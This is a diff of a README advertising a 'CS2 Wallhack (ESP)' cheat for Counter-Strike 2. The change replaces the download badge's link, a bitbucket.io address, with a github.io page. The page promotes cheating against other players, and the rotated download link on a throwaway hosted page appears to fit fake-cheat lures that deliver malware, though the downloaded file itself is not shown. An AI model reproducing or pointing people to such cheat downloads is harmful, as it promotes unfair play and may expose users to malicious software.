@@ -4,7 +4,7 @@ Wanna own every lobby in CS2 without sweating? 💀 Then you’re in the right p
 
 Whether you're grinding ranked or messing around with your crew, this ESP cheat gives you *that* unfair edge CS2 players secretly dream about.
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://Counter-Strike-2-Wallhack-myd.github.io/.github)
 ---
 
 ## What Is CS2 Wallhack (ESP)? 👀
